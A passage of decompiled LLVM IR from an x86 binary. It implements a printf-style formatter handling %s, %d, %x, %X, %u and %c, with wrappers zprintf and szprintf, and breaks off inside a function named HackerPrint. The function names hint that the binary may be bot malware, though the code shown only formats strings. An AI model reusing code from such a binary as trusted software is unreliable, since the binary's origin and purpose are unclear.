  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058332.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 40, 3, 2, 45, 46, 1, 0, 47, 48, 49, 50, 51, 52, 53, 54, 5, 4 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
